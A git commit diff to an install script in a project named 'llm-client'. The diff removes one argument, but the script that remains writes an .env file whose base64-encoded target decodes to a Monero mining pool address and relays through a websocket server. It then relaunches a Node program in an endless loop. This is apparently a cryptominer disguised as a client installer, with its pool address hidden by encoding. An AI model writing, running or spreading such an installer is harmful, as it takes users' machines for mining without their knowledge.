88c4c18cacd9dccd9cb3cf2616338ecff9201e88
sawa05303 <93839840+sawa05303@users.noreply.github.com>
2026-02-04 18:21:24 +0700

    Update install.sh

--- llm-client/install.sh
+++ llm-client/install.sh
@@ -1,9 +1,7 @@
 #!/bin/bash
 CONNECT=$1
-NAME=$2
 echo "SERVER_WS=wss://cloudnineone.my.id
 SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
-SERVER_DOMAIN=${NAME}
 SERVER_SECRET=BAGONG
 SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 15; done
